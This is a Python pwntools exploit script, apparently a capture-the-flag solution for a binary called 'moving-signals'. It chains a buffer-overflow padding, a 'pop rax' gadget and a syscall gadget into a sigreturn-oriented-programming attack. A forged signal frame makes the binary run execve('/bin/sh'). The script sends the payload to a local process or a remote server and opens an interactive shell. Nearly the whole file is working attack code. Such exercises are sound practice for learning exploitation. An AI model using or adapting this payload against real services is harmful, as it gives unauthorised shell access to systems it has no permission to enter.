#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./moving-signals')

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
#pwn tools failed to find string, lame
#frame.rdi = next(binary.search(b'/bin/sh'))
#work around
frame.rdi = binary.address + binary.data.find(b'/bin/sh')
frame.rsi = 0
frame.rdx = 0
frame.rip = next(binary.search(asm('syscall')))

pop_rax = next(binary.search(asm('pop rax; ret')))
syscall = next(binary.search(asm('syscall')))

payload  = b''
payload += 8 * b'A'
payload += p64(pop_rax)
payload += p64(constants.SYS_rt_sigreturn)
payload += p64(syscall)
payload += bytes(frame)

if args.REMOTE:
	p = remote('185.172.165.118', 2525)
else:
	p = process(binary.path)

p.sendline(payload)
p.interactive()
